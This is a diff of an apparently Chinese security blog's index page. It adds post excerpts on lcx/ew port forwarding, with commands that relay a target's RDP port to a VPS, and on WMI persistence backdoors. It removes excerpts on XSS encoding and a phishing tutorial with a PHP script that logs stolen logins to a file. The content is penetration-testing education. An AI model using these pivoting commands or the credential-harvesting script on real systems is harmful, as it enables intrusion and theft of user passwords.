@@ -117,6 +117,170 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/08/12/ew-slave.html" >ew端口转发与SOCKS5代理</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-08-12  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>首先第一点: 端口转发和socks代理两个是不一样的东西。</p>
+<p>根据<a target="_blank" rel="noopener" href="http://rootkiter.com/2015/04/28/LCX_SOCKS.html">http://rootkiter.com/2015/04/28/LCX_SOCKS.html</a>里面提到的端口转发工具有三种工作状态:</p>
+<ul>
+<li>slave 客户端接客户端      -slave ConnectHost ConnectPort TransmitHost TransmitPort </li>
+<li>tran  服务端接客户端      -tran  ConnectPort TransmitHost TransmitPort</li>
+<li>listen 服务端接服务端     -listen ConnectPort TransmitPort</li>
+</ul>
+<p>再来个例子<a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p>
+<pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave 139.xx.xx.xx 9000 10.10.10.2 3389 &#x2F;&#x2F;目标机器的所有数据转发到公网vps的9000端口
+lcx.exe -listen 9000 5555   &#x2F;&#x2F;将本机9000端口监听的数据转发到本机5555端口
+通过上门两个端口转发，可以登陆vps上面的5555端口，或者vps上面127.0.0.1的的5555端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>上面两个对应的ew是这么写的：</p>
+<pre class="line-numbers language-none"><code class="language-none">ew.exe -s lcx_slave -d 45.xx.xx.xx -e 9000 -f 127.0.0.1 -g 3389
+.&#x2F;ew_for_linux64 -s lcx_listen -l 5555 -e 9000
+
+第一个靶机可以抓发vps访问不到的ip，比如linux的22端口，也就是把这个机子作为跳板。 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h3><ul>
+<li>如果目标有公网IP:</li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2017/08/12/ew-slave.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>首先第一点: 端口转发和socks代理两个是不一样的东西。</p>
+<p>根据<a target="_blank" rel="noopener" href="http://rootkiter.com/2015/04/28/LCX_SOCKS.html">http://rootkiter.com/2015/04/28/LCX_SOCKS.html</a>里面提到的端口转发工具有三种工作状态:</p>
+<ul>
+<li>slave 客户端接客户端      -slave ConnectHost ConnectPort TransmitHost TransmitPort </li>
+<li>tran  服务端接客户端      -tran  ConnectPort TransmitHost TransmitPort</li>
+<li>listen 服务端接服务端     -listen ConnectPort TransmitPort</li>
+</ul>
+<p>再来个例子<a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p>
+<pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave 139.xx.xx.xx 9000 10.10.10.2 3389 &#x2F;&#x2F;目标机器的所有数据转发到公网vps的9000端口
+lcx.exe -listen 9000 5555   &#x2F;&#x2F;将本机9000端口监听的数据转发到本机5555端口
+通过上门两个端口转发，可以登陆vps上面的5555端口，或者vps上面127.0.0.1的的5555端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>上面两个对应的ew是这么写的：</p>
+<pre class="line-numbers language-none"><code class="language-none">ew.exe -s lcx_slave -d 45.xx.xx.xx -e 9000 -f 127.0.0.1 -g 3389
+.&#x2F;ew_for_linux64 -s lcx_listen -l 5555 -e 9000
+
+第一个靶机可以抓发vps访问不到的ip，比如linux的22端口，也就是把这个机子作为跳板。 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h3><ul>
+<li>如果目标有公网IP:</li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2017/08/12/ew-slave.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/07/12/wmi.html" >WMI学习笔记</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-07-12  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="windows下的定时任务"><a href="#windows下的定时任务" class="headerlink" title="windows下的定时任务"></a>windows下的定时任务</h3><blockquote>
+<p>维持权限的话还是考虑WMI事件或者在服务上下手.  如劫持相关服务指向的程序，未被双引号保护的路径等，添加计划任务一旦被报警.就是整个团队的灾难</p>
+</blockquote>
+<h2 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h2><p>wmi的逻辑结构是这样的：<br>首先是wmi使用者，比如脚本或者其他用到wmi接口的应用程序。由wmi使用者访问CIM对象管理器WinMgmt（即WMI服务），后者再访问CIM（公共信息模型Common Information Model）存储库。</p>
+<p>静态或动态的信息（对象的属性）就保存在CIM库中，同时保存对象的方法。比如启动一个服务，通过执行对象的方法实现，实际上是通过COM技术调用各种dll，最后由dll中封装的API完成请求。WMI是事件驱动的，操作系统、服务、应用程序、设备驱动程序等都可以作为事件源，通过COM接口生成事件通知，WinMgmt捕捉到事件，然后刷新CIM库中的动态信息。这也是为什么WMI服务依赖于EventLog的原因。就像注册表有根键一样，CIM库也有分类，用面向对象的术语描述来来说，叫做命名空间(Name Space）</p>
+<p><a target="_blank" rel="noopener" href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p>
+<p>可以调用wmi的方式或者语言:</p>
+<pre class="line-numbers language-none"><code class="language-none">* wmic.exe
+* winrm.exe
+* winrs.exe
+* powershell
+* windows scripting host(WSH)
+   * VBScript
+   * JScript
+* mof
+* C&#x2F;C++ via IWbem* COM API
+* .NET System.Management classes
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>单一点：<br>一个定时功能后门的wmi，其中的事件过滤是用WQL查询来触发，wooyun上面油三种触发方式:</p>
+<h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3>
+	
+
+	</div>
+  <a type="button" href="/2017/07/12/wmi.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="windows下的定时任务"><a href="#windows下的定时任务" class="headerlink" title="windows下的定时任务"></a>windows下的定时任务</h3><blockquote>
+<p>维持权限的话还是考虑WMI事件或者在服务上下手.  如劫持相关服务指向的程序，未被双引号保护的路径等，添加计划任务一旦被报警.就是整个团队的灾难</p>
+</blockquote>
+<h2 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h2><p>wmi的逻辑结构是这样的：<br>首先是wmi使用者，比如脚本或者其他用到wmi接口的应用程序。由wmi使用者访问CIM对象管理器WinMgmt（即WMI服务），后者再访问CIM（公共信息模型Common Information Model）存储库。</p>
+<p>静态或动态的信息（对象的属性）就保存在CIM库中，同时保存对象的方法。比如启动一个服务，通过执行对象的方法实现，实际上是通过COM技术调用各种dll，最后由dll中封装的API完成请求。WMI是事件驱动的，操作系统、服务、应用程序、设备驱动程序等都可以作为事件源，通过COM接口生成事件通知，WinMgmt捕捉到事件，然后刷新CIM库中的动态信息。这也是为什么WMI服务依赖于EventLog的原因。就像注册表有根键一样，CIM库也有分类，用面向对象的术语描述来来说，叫做命名空间(Name Space）</p>
+<p><a target="_blank" rel="noopener" href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p>
+<p>可以调用wmi的方式或者语言:</p>
+<pre class="line-numbers language-none"><code class="language-none">* wmic.exe
+* winrm.exe
+* winrs.exe
+* powershell
+* windows scripting host(WSH)
+   * VBScript
+   * JScript
+* mof
+* C&#x2F;C++ via IWbem* COM API
+* .NET System.Management classes
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>单一点：<br>一个定时功能后门的wmi，其中的事件过滤是用WQL查询来触发，wooyun上面油三种触发方式:</p>
+<h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3>
+	
+	</div>
+  <a type="button" href="/2017/07/12/wmi.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/05/24/schtasks定时后门.html" >powershell定时任务后门</a>
 		</h3>
 		</div>
@@ -551,178 +715,6 @@ if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/04/12/xss-encode2.html" >XSS编码</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-04-12  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li><a href="http://jkme.github.io/xss-encode-decode.html">http://jkme.github.io/xss-encode-decode.html</a></li>
-<li><a target="_blank" rel="noopener" href="http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html">http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html</a></li>
-</ul>
-<p>在前面文章里面xss的编码提到过这个东西: </p>
-<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
-1. HTML Decoding
-2. URL Decoding
-3. Javascript Decoding
-
-http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在<strong>HTML标签里面</strong>，js之行之前，html形式的编码会自动decode。</p>
-<p>解释：</p>
-<p><code>&lt;button type=&quot;submit&quot; onclick=&quot;x=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;;document.write(HtmlEncode(x))&quot;&gt;xsstest&lt;/button&gt;</code></p>
-<p>丢到test.html里面，使用浏览器打开还是原样。</p>
-<p>所以xss存在的步骤来说是这样的：<br><code>代码--&gt; 浏览器执行 --&gt; xss</code></p>
-<p>浏览器解释了其中的代码展现给人看。</p>
-<p>HTML的自动解码是在执行js代码之前，并且<code>on*</code>事件内可以执行js脚本，即 <strong>html解码之后才可以执行js</strong>。</p>
-	
-
-	</div>
-  <a type="button" href="/2017/04/12/xss-encode2.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li><a href="http://jkme.github.io/xss-encode-decode.html">http://jkme.github.io/xss-encode-decode.html</a></li>
-<li><a target="_blank" rel="noopener" href="http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html">http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html</a></li>
-</ul>
-<p>在前面文章里面xss的编码提到过这个东西: </p>
-<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
-1. HTML Decoding
-2. URL Decoding
-3. Javascript Decoding
-
-http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在<strong>HTML标签里面</strong>，js之行之前，html形式的编码会自动decode。</p>
-<p>解释：</p>
-<p><code>&lt;button type=&quot;submit&quot; onclick=&quot;x=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;;document.write(HtmlEncode(x))&quot;&gt;xsstest&lt;/button&gt;</code></p>
-<p>丢到test.html里面，使用浏览器打开还是原样。</p>
-<p>所以xss存在的步骤来说是这样的：<br><code>代码--&gt; 浏览器执行 --&gt; xss</code></p>
-<p>浏览器解释了其中的代码展现给人看。</p>
-<p>HTML的自动解码是在执行js代码之前，并且<code>on*</code>事件内可以执行js脚本，即 <strong>html解码之后才可以执行js</strong>。</p>
-	
-	</div>
-  <a type="button" href="/2017/04/12/xss-encode2.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/04/01/how-to-fish.html" >How To Fishing</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-04-01  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[XSS钓鱼模拟实战]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
-</blockquote>
-<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html
-假的登录页面: fake.html
-世界上最好的语言: deal.php
-fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul>
-<li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li>
-</ul>
-<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p>
-<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
-<ul>
-<li>然后再服务器上构造一个deal.php</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-$user &#x3D; $_POST[&#39;username&#39;];
-$pass &#x3D; $_POST[&#39;password&#39;];
-$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
-fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
-fclose($f);
-header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<ul>
-<li>还差一个js</li>
-</ul>
-	
-
-	</div>
-  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[XSS钓鱼模拟实战]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
-</blockquote>
-<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html
-假的登录页面: fake.html
-世界上最好的语言: deal.php
-fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul>
-<li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li>
-</ul>
-<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p>
-<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
-<ul>
-<li>然后再服务器上构造一个deal.php</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-$user &#x3D; $_POST[&#39;username&#39;];
-$pass &#x3D; $_POST[&#39;password&#39;];
-$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
-fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
-fclose($f);
-header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<ul>
-<li>还差一个js</li>
-</ul>
-	
-	</div>
-  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -774,13 +766,13 @@ header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>7</span></a></li>
+			<li><a href="/categories/Java/">Java<span>8</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>44</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -801,6 +793,14 @@ header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
+      </li>
+    
+      <li>
+        <a href="/2022/06/23/java-agent-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(4)-Java Agent</a>
+      </li>
+    
+      <li>
         <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
       </li>
     
@@ -810,14 +810,6 @@ header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x
     
       <li>
         <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/06/CVE-2022-22965.html" ><i class="fa fa-file-o"></i>CVE-2022-22965漏洞记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
       </li>
     
   </ul>
